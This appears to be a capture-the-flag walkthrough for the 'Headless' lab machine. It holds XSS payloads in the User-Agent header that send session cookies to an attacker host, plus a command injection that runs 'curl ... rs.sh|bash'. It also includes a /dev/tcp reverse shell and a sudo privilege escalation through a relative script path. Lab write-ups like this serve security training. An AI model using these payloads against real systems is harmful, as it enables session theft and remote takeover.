User FLAG
-----

1. Scan ports, found 22 and 5000
2. Application is running on port 5000
3. Once inside we check the support page
4. Tried SQL injection, but it didn't work
5. Intercept the request that was made in /support
6. Change the User-Agent to a payload that will send the cookie to our machine

'"><iframe_src"http://10.10.14.9/?c="+document.cookie;></iframe>
<img src=x onerror="this.src='http://10.10.14.9/?c='+document.cookie;"/>

Before sending the request, we should have netcat listening on port 80

```bash
nc -lvnp 80
```

```
POST /support HTTP/1.1
Host: 10.129.237.10:5000
Content-Length: 81
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.129.237.10:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: <img src=x onerror="this.src='http://10.10.14.9/?c='+document.cookie;"/>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.237.10:5000/support
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,gl;q=0.8,es;q=0.7
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Connection: close

fname=ada&lname=dad&email=agustinba&phone=ada&message=%3C%3E
```

```bash
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

Once we have the cookie, we go back to /dashboard and use the new cookie we got

We see that there is a report that receives a date as payload, we capture this and do a command injection

Open another netcat listener on port 8000

```
POST /dashboard HTTP/1.1
Host: headless.htb:5000
Content-Length: 53
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://headless.htb:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://headless.htb:5000/dashboard
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
Connection: close

date=2023-09-02|curl http://10.10.14.9:8000/rs.sh|bash
```

Where rs.sh is something like this

```bash
bash -i >& /dev/tcp/10.10.14.9/4444 0>&1
```

We got a reverse shell

Root FLAG
-----

1. Once inside we check the sudo permissions
2. We can run /usr/bin/syscheck as root
3. After reading `syscheck` we can see that it runs `initdb.sh` anywhere

```bash
sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

```bash
cat /usr/bin/syscheck
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi
```

```bash
#!/bin/bash

cat /root/root.txt > flag.txt
```

## Links

- https://henrik-andreasson.github.io/syscheck/syscheck-scripts/
- https://github.com/payloadbox/xss-payload-list
- https://hackbotone.com/cross-site-scripting-reflected-user-agent-209b1505319f